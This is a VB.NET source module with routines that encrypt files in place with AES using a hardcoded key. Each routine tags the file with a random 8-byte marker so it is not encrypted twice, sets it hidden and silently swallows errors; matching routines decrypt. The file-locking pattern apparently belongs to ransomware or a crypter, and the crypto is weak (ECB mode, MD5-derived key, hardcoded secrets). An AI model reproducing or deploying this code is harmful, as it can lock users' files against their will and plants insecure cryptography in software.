Imports System.IO
Imports System.Security.Cryptography
Imports System.Security.Cryptography.X509Certificates
Imports System.Text
Public Module Security

    Private Caracterisk As String() = {"÷NÃ¾Gß[", "¶9ÜQ?ÛÉ'", "¾ÖVÇ³", "NŸK=Î•ºŸ", "1†ßKÓZÑ", "ÜÃGØ†Ë'", "ÀÞÑ‘ÏÚ", "²D}À9ËÝÅ", "¤—ÀLÖ~'", "ÆY×ÃÝ9¯Ü"}

    Public Sub AES_Encrypt(ByVal Input As String)

        Dim Rand As Random = New Random
        Dim Count As Integer = Rand.Next(Caracterisk.Count)
        Dim Indicator As Byte() = Encoding.Default.GetBytes(Caracterisk(Count))
        Dim FileBytes() = System.IO.File.ReadAllBytes(Input)

        Dim G = FileBytes.Take(8).ToArray
        Dim GETF As String = Encoding.Default.GetString(G)

        If Caracterisk.Contains(GETF) Then
            Exit Sub
        End If

        SetAttr(Input, FileAttribute.Normal)
        Dim Pass As String = "╄ᦈ⍐ᔌ੭⟵Ⓣ⢩Ŀ⥱ᗣকᛩℑɼϾ"
        Dim managed As New RijndaelManaged
        Dim provider As New MD5CryptoServiceProvider
        Try
            Dim destinationArray As Byte() = New Byte(&H20 - 1) {}
            Dim sourceArray As Byte() = provider.ComputeHash(Encoding.ASCII.GetBytes(Pass))
            Array.Copy(sourceArray, 0, destinationArray, 0, &H10)
            Array.Copy(sourceArray, 0, destinationArray, 15, &H10)
            managed.Key = destinationArray
            managed.Mode = CipherMode.ECB
            Dim transform As ICryptoTransform = managed.CreateEncryptor

            Dim FinalyEncryptedFile As Byte() = transform.TransformFinalBlock(FileBytes, 0, FileBytes.Length)
            System.IO.File.WriteAllBytes(Input, Indicator.Concat(FinalyEncryptedFile).ToArray)

            SetAttr(Input, FileAttribute.Hidden)
        Catch EX As Exception
            ' MsgBox(EX.Message)
        End Try

    End Sub

    Public Sub AES_Decrypt(ByVal Input As String)

        Dim FileBytes = System.IO.File.ReadAllBytes(Input)
        Dim Indicator As String = Encoding.Default.GetString(FileBytes.Take(8).ToArray)
        Dim EncryptedFile As Byte() = FileBytes.Skip(8).ToArray

        If Not Caracterisk.Contains(Indicator) Then
            Exit Sub
        End If

        SetAttr(Input, FileAttribute.Normal)
        Dim Pass As String = "╄ᦈ⍐ᔌ੭⟵Ⓣ⢩Ŀ⥱ᗣকᛩℑɼϾ"
        Dim managed As New RijndaelManaged
        Dim provider As New MD5CryptoServiceProvider
        Try
            Dim destinationArray As Byte() = New Byte(&H20 - 1) {}
            Dim sourceArray As Byte() = provider.ComputeHash(Encoding.ASCII.GetBytes(Pass))
            Array.Copy(sourceArray, 0, destinationArray, 0, &H10)
            Array.Copy(sourceArray, 0, destinationArray, 15, &H10)
            managed.Key = destinationArray
            managed.Mode = CipherMode.ECB
            Dim transform As ICryptoTransform = managed.CreateDecryptor
            System.IO.File.WriteAllBytes(Input, transform.TransformFinalBlock(EncryptedFile, 0, EncryptedFile.Length))

        Catch Ex As Exception
            '   MsgBox(Ex.Message)
        End Try
       
    End Sub

    Public Function AESE(ByVal input As Byte()) As Byte()
        Dim Key As String = "⢤≐⠀ⵉᒊᐍ⋃ᓭ✁⎊』⥸ਢƟᖌϦ"
        Dim AES As New System.Security.Cryptography.RijndaelManaged
        Dim SHA256 As New System.Security.Cryptography.SHA256Cng
        Try
            AES.Key = SHA256.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(Key))
            AES.Mode = CipherMode.ECB
            Dim DESEncrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateEncryptor
            Dim Buffer As Byte() = input
            Return DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
        Catch ex As Exception
            Return Nothing
        End Try
    End Function

    Public Function AESD(ByVal input As Byte()) As Byte()
        Dim Key As String = "⢤≐⠀ⵉᒊᐍ⋃ᓭ✁⎊』⥸ਢƟᖌϦ"
        Dim AES As New System.Security.Cryptography.RijndaelManaged
        Dim SHA256 As New System.Security.Cryptography.SHA256Cng
        Try
            AES.Key = SHA256.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(key))
            AES.Mode = CipherMode.ECB
            Dim DESDecrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateDecryptor
            Dim Buffer As Byte() = input
            Return DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
        Catch ex As Exception
            Return Nothing
        End Try
    End Function

End Module
